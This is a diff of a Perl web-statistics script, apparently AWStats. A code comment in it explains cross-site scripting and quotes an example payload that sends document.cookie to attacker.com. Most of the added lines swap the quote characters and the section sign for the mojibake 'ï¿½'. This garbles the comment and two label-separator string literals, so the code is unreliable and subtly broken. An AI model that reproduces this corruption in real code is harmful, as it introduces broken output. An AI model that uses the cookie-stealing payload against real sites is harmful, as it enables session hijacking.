@@ -4446,7 +4446,7 @@ sub Sanitize {
 #               and clean | char.
 #				A XSS attack is providing an AWStats url with XSS code that is executed
 #				when page loaded by awstats CGI is loaded from AWStats server. Such a code
-#				can be<script>document.write("<img src=http://attacker.com/” + document.cookie + “>”)</script>
+#				can be<script>document.write("<img src=http://attacker.com/ï¿½ + document.cookie + ï¿½>ï¿½)</script>
 #				This make the browser sending a request to the attacker server that contains
 #				cookie used for AWStats server sessions. Attacker can this way caught this
 #				cookie and used it to go on AWStats server like original visitor. For this
@@ -7737,7 +7737,7 @@ if (scalar keys %HTMLOutput) {
 
 	# HTMLHeadSection
 	if ($FrameName ne 'index' && $FrameName ne 'mainleft') {
-		print "<a name=\"top\">&nbsp;</a>\n\n";
+		print "<a name=\"top\"></a>\n\n";
 		my $newhead=$HTMLHeadSection;
 		$newhead =~ s/\\n/\n/g;
 		print "$newhead\n";
@@ -9201,7 +9201,7 @@ if (scalar keys %HTMLOutput) {
 				my @blocklabel=();
 				for (my $ix=1; $ix<=12; $ix++) {
 					my $monthix=sprintf("%02s",$ix);
-					push @blocklabel,"$MonthNumLib{$monthix}\§$YearRequired";
+					push @blocklabel,"$MonthNumLib{$monthix}\ï¿½$YearRequired";
 				}
 				my @vallabel=("$Message[11]","$Message[10]","$Message[56]","$Message[57]","$Message[75]");
 				my @valcolor=("$color_u","$color_v","$color_p","$color_h","$color_k");
@@ -9395,7 +9395,7 @@ if (scalar keys %HTMLOutput) {
 					if (! DateIsValid($day,$month,$year)) { next; }			# If not an existing day, go to next
 					my $bold=($day==$nowday && $month==$nowmonth && $year==$nowyear?':':'');
 					my $weekend=(DayOfWeek($day,$month,$year)=~/[06]/?'!':'');
-					push @blocklabel,"$day§$MonthNumLib{$month}$weekend$bold";
+					push @blocklabel,"$dayï¿½$MonthNumLib{$month}$weekend$bold";
 				}
 				my @vallabel=("$Message[10]","$Message[56]","$Message[57]","$Message[75]");
 				my @valcolor=("$color_v","$color_p","$color_h","$color_k");
